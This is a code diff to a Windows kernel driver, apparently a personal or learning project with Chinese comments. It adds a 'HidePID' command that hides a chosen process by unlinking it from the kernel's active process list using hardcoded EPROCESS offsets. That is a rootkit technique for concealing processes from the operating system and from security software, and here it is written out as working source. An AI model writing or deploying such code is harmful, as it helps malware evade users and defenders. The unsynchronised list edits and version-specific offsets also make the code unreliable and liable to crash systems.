@@ -161,6 +161,11 @@ ULONG_PTR ReadDisp(LPCH FunName, LPMyInfoSend pInfo)
 		//KdPrint(("比较: %s %s %lu->删除文件\n", FunName, "DelFile", uRet));
 		return DelFile(pInfo);
 	}
+	else if (8 == (uRet = RtlCompareMemory(FunName, "HidePID", 8)))
+	{
+		KdPrint(("比较: %s %s %lu->隐藏进程\n", FunName, "HidePID", uRet));
+		return HidePID(pInfo);
+	}
 	else if (8 == (uRet = RtlCompareMemory(FunName, "ExitPID", 8)))
 	{
 		//KdPrint(("比较: %s %s %lu->结束进程\n", FunName, "ExitPID", uRet));
@@ -709,4 +714,46 @@ ULONG_PTR DelFile(LPMyInfoSend pInfo)
 	UNREFERENCED_PARAMETER(pInfo);
 	WCHAR* Path = L"\\??\\D:\\data.txt";
 	return NT_SUCCESS(DeleteFile(Path));
+}
+
+ULONG_PTR HidePID(LPMyInfoSend pInfo)
+{
+	ULONG PID = pInfo->ulNum1;
+	PEPROCESS Process = NULL;
+	if (!NT_SUCCESS(PsLookupProcessByProcessId(ULongToHandle(4), &Process)))
+	{
+		KdPrint(("无法获取EPROCESS PID=[%lu]！\n", PID));
+		return 0;
+	}
+	PLIST_ENTRY pActiveProcessLinks =((PLIST_ENTRY)((char*)Process + 0xb8));
+	PLIST_ENTRY pNextPtr = pActiveProcessLinks->Flink;
+	int count = 0;
+
+	typedef struct
+	{
+		DWORD_PTR	EProcess;
+		UCHAR* ImageName;
+		ULONG		ProcessID;
+	}_Process_Info;
+
+	while (pNextPtr->Flink != pActiveProcessLinks->Flink) {
+		_Process_Info ProcessInfo;
+
+		ProcessInfo.EProcess = ((DWORD_PTR)pNextPtr - 0xb8);
+		ProcessInfo.ImageName = (UCHAR*)(ProcessInfo.EProcess + 0x16c);
+		ProcessInfo.ProcessID = *((ULONG*)(ProcessInfo.EProcess + 0xb4));
+		KdPrint(("SpriteDrv: Image File Name: %s\t\t%d\n", ProcessInfo.ImageName, ProcessInfo.ProcessID));
+
+		// 因为部分进程取出来的进程名会有问题 (部分没有\0符 也没有在结构里找到长度元素)
+		// 所以用PID来判断是否为被隐藏的进程
+		if (ProcessInfo.ProcessID == PID) {
+			// 摘链操作
+			pNextPtr->Blink->Flink = pNextPtr->Flink;
+			pNextPtr->Flink->Blink = pNextPtr->Blink;
+			return TRUE;
+		}
+		count++;
+		pNextPtr = pNextPtr->Flink;
+	}
+	return 0;
 }
